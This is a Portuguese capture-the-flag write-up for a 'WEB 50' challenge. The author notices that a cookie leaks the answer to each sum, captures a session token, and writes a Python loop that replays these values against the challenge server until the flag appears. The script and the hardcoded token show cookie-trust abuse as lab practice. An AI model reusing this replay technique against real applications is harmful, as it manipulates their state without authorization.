# WEB 50

**O Problema**

Marque 1337 pontos para conseguir a flag... talvez seja melhor "hackear" a aplicação..


A página apresentava um texto com o nome do jogador informando que ele deveria chega à 1337 pontos. Nessa página era apresentada uam
soma e a ideia era ir acertanod a soma até juntar os 1337 pontos

**A Resolução**

O próprio enunciado já sugeria de "hackear" a página. A primeira idéia  já foi criar um script que automatizasse a tarefa e a primeira coisa que pensei foi em usar o *curl*. Quando fiz a requisição na página para pegar o HTML vem a primeira falha, o retorno é somente as tags abaixo:

```html
<center></center>
```

Bom, com esse resultado precisamos determinar o que mais de informação é enviado na requisição. Quando o desafio é web eu geralmente já sigo uma regra para analisar o problema: código fonte, cookies, parâmetros submetidos.

Olhando o código fonte não encontramos nada demais. É um formulário HTTP simples, somente precisaremos tomar o cuidado de realizar o envio dos dados para uma página diferente da que é exibida com a soma a ser realizada:

```html
...
<form method='POST' action='valida.php'>
...
<input type='text' name='resultado'><br>
...
```
Quando verificamos os cookies, nesse caso no própio retorno do comando *curl*, temos um achado bem interessante:

```
< Set-Cookie: result=1551; expires=Thu, 03-Nov-2016 01:49:40 GMT; Max-Age=3600
```

Bom, um cookie chamado *resul*?! E sim, quando olhamos a página que foi exibida com esse cookie vemos que ele é o resultado da soma que precisamos enviar para ser validado. Então uma parte da chall ta morta, basta enviar o conteúdo do cookie *result* recebido, na próxima requisição. O ponto de atenção é: temos que enviar ele tanto nos cookies da requisição quanto no campo de dados, como valor do campo *resultado* do formulário.

OK, então já temos o resultado, que se não fosse o cookie seria preciso extrair a expressão da página para realizar o cálculo, já temos a página para validar, mas ainda tem um problema: como validar a resposta?! somente enviar a informação do resultado não garante a contabilização do acerto!!!

Nesse ponto não tem jeito, a forma é fazer pelo menos uma requisição manual, na página e analisar o que é enviado. Tem diversas formas de você fazer isso: mitmproxy, wireshark, extensões de navegador...Escolha a que preferir. Eu usei uma extensão do Chrome, chamada [Postman](https://www.getpostman.com/apps).

Com a captura habilitada fiz enviei uma requisição com o resultado e *voilà*, os cookies:

```
token=048dd3ec94979b395ef082e63ec70286; result=1773
```

Pronto, fazemos uma requisição com os cookies *token* e *result*, o campo *resultado*, e na resposta pegamos o próximo resultado, posta  e assim sucessivamente até completar os 1337 pontos. Então o código para fazer essas requisições fica assim:

``` python
#!/usr/bin/python3

import sys,requests,re


#CONSTANTS

PLAY_URL= 'http://162.243.187.35:8081/play.php'
VALIDATE_URL= 'http://162.243.187.35:8081/valida.php'
TOKEN= '048dd3ec94979b395ef082e63ec70286'

#REGEX TO GET FLAG
pattern = re.compile(r'Flag: (.*) Acerto')

if __name__ == '__main__':


    #Get the operation and the cookie which contains the result on first request
    req_page= requests.get(PLAY_URL,cookies={'token':TOKEN})

    match = pattern.search(req_page.text)
    flag = match.group(1)

    while flag == '********':

        resultado = req_page.cookies['result']

        req_page = requests.post(VALIDATE_URL,data={'resultado':resultado},cookies={'token':TOKEN,'result':resultado})

        match = pattern.search(req_page.text)
        flag = match.group(1)


    print("Flag: " + flag )
    sys.exit(0)
```

Algumas considerações:
 * Como a página de validação é diferente, ao realizar a requisição ela retorna 302 enviando novamente para a página com a próxima soma. Isso não interfere na execução da requisição quando usamos o módulo *requests* do python, mas caso utilize o *curl* ele não segue o redirecionamento sozinho. Para formas de realizar a requisição que não acompanhem o redirecionamento seu código deve realizar uma nova chamada na página para onde foi realizado o redirecionamento pegando assim o novo cookie com a próxima conta e o resultado.
 * Esse código quebra quando encontra a flag por conta da chamada no **match.group()** . Isso é culpa do H4kBoot, o autor da flag. Quando você chega no resultado a string da página não segue o formato que a expressão regular checa. Poderia corrigir no código, deixo pra quem tiver interesse. No caso desse problema isso não interfere para conseguir a flag, porque a página que é exibida no navegador utiliza sessão baseado no token e quando o código finalizar basta acessar a página no browser novamente.